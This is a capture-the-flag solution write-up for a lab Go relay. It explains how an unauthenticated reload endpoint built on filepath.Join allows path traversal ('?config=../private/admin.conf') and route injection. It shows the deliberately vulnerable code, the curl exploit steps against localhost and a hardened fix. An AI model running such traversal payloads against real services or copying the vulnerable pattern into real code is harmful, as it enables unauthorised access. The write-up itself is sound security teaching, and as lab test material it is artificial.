# w20 Relay Veil :: solution

## Root cause

The reload endpoint takes a filename from the query string and joins it onto the
config directory without validating that the result stays inside it.

`relay/main.go`, `loadTable()`:

```go
func loadTable(filename string) ([]route, string, error) {
	// VULNERABLE: the operator-supplied name is joined onto the config
	// directory with no validation. filepath.Join cleans ".." on the way, so
	// the result lands wherever the operator points it.
	//
	// ponytail: we Join instead of concatenating precisely because Join is
	// supposed to make this safe. It makes the path well-formed; it does not
	// make it contained.
	full := filepath.Join(confDir, filename)
	body, err := os.ReadFile(full)
	if err != nil {
		return nil, full, err
	}
	return parseTable(string(body)), full, nil
}
```

and the handler that calls it:

```go
func handleReload(w http.ResponseWriter, r *http.Request) {
	name := r.URL.Query().Get("config")
	if name == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "missing ?config="})
		return
	}
	rt, full, err := loadTable(name)
	...
	applyTable(rt)
```

The design intent is sound in outline: the relay should only load tables it
ships, and `conf.d/` is where those live. The mistake is that **the endpoint
loads whatever path it is handed**, and the only thing standing between the
caller and the filesystem is `filepath.Join`.

`filepath.Join` is documented to *clean* the result: it resolves `.` and `..`
and drops empty elements. That is exactly the wrong tool here. Cleaning is what
makes the traversal *work* — it turns

```
/srv/relay/conf.d/../private/admin.conf
```

into the well-formed

```
/srv/relay/private/admin.conf
```

which `os.ReadFile` then happily opens. A developer who reasons "I'm using
`Join`, so I can't be walked out of the directory" has the property backwards:
`Join` normalizes, it does not confine. It is the *accomplice*, not the guard.

The second half of the bug is the design's own shape. The relay's security
boundary is **which tables are loaded**, not who may load them — there is no
authentication on `/api/reload` at all. So once you can name a table, you can
load it, and loading it registers its routes.

## Recon

The landing page states the two tables and the reload syntax. Confirm the relay
is up, and note what it reports about its own load set:

```bash
curl -s http://localhost:30020/api/health
# {"conf_dir":"/srv/relay/conf.d","lab":"w20","route_count":3,
#  "service":"relay-veil","tables":["/srv/relay/conf.d/public.conf"],...}
```

`conf_dir` is `/srv/relay/conf.d`. The management table is documented as living
at `private/admin.conf` relative to the relay root — which, from the config
directory, is `../private/admin.conf`.

Confirm the public surface works, so you know the relay is dispatching at all:

```bash
curl -s http://localhost:30020/status
# {"service":"control-0","version":"0.20.0","surfaces":["public","control"]}
```

Now confirm the admin route is **not** loaded at boot. This is the check that
tells you the route is a thing to be *reached*, not a thing already sitting open:

```bash
curl -s http://localhost:30020/admin/secret
# {"error":"no route","path":"/admin/secret"}
```

The upstream also enumerates its own surfaces, including the control plane it is
not currently being asked about:

```bash
curl -s http://localhost:30020/status
# {"service":"control-0","surfaces":["public","control"]}
```

## Exploit

Reload the management table by naming it with a parent-directory step:

```bash
curl -s -X POST 'http://localhost:30020/api/reload?config=../private/admin.conf'
```

```json
{
  "count": 2,
  "loaded": "/srv/relay/private/admin.conf",
  "routes": ["/admin/secret", "/admin/reload"]
}
```

`loaded` shows the resolved path — the join took the `..` and produced a clean
path one level above the config directory. The relay has now registered two new
routes.

Fetch the admin route:

```bash
curl -s http://localhost:30020/admin/secret
```

```json
{
  "service": "control-0",
  "surface": "control",
  "via_relay": true,
  "flag": "hex4b0t{...}"
}
```

`via_relay: true` is the upstream confirming the request arrived through the
relay's dispatch loop, i.e. the route is genuinely live in the relay's table.

`solution/exploit.sh` runs both steps and greps the flag.

## Dead ends worth recording

**Naming the table directly** — `?config=admin.conf` — does **not** work. The
management table is outside `conf.d/`, so the join produces
`/srv/relay/conf.d/admin.conf`, which does not exist. This is the whole point of
the layout: the traversal is not a convenience for reaching a file that is
already adjacent, it is the only way to leave the directory.

**`..` with an absolute path** — `?config=/etc/passwd` — is silently defeated by
`Join`, which drops the leading component when an element is absolute *and
cleaned against the base*. The result is
`/srv/relay/conf.d/etc/passwd`, which does not exist. (This is a good reminder
that `Join`'s behaviour is subtle in both directions: it blocks absolute paths
by accident while enabling traversal by accident.)

## The fix

There are two independent things wrong, and fixing either alone is insufficient.

**1. Confine the name, don't just join it.** Validate that the resolved path is
still inside the config directory, *after* resolution:

```go
func loadTable(filename string) ([]route, string, error) {
    // Reject any name that is not a single path element. This is the shape the
    // endpoint actually needs: the caller names a table, not a path.
    if filename != filepath.Base(filename) || strings.ContainsAny(filename, `/\`) {
        return nil, "", fmt.Errorf("invalid table name %q", filename)
    }
    full := filepath.Join(confDir, filename)

    // Belt and braces: resolve and confirm containment.
    resolved, err := filepath.EvalSymlinks(full)
    if err != nil {
        return nil, full, err
    }
    if !strings.HasPrefix(resolved+string(os.PathSeparator), confDir+string(os.PathSeparator)) {
        return nil, resolved, fmt.Errorf("table %q is outside %s", filename, confDir)
    }
    body, err := os.ReadFile(resolved)
    ...
}
```

The first check is the one that matters: a config name is a **name**, and a name
has no separators. Rejecting separators makes traversal impossible regardless of
what `Join` does. The containment check catches the case where a name is fine
but something on disk is a symlink out of the directory.

**2. Do not let config loading be unauthenticated.** The security boundary here
is the loaded route table, and a reload changes it — that is a privileged
operation. `/api/reload` should require authentication and should be bound to
the management plane (the loopback control socket the admin table itself
mentions), not published alongside the public routes. A traversal that only an
operator can invoke is a bug; a traversal anyone can invoke is a remote route
injection.

The general lesson: **`filepath.Join` is a formatting function, not a sandbox.**
Any time a path component comes from outside, resolve the final path and check
containment explicitly — and prefer rejecting the component outright when the
API only ever needs to name a file, not to address one.

## Flag

Injected at runtime into the internal upstream only (`W0B_FLAG`). The relay
never reads it; it only holds the route table that makes the upstream's control
surface reachable.

## Submit

```bash
./manage.sh submit 'hex4b0t{...}' ai-pilot
```
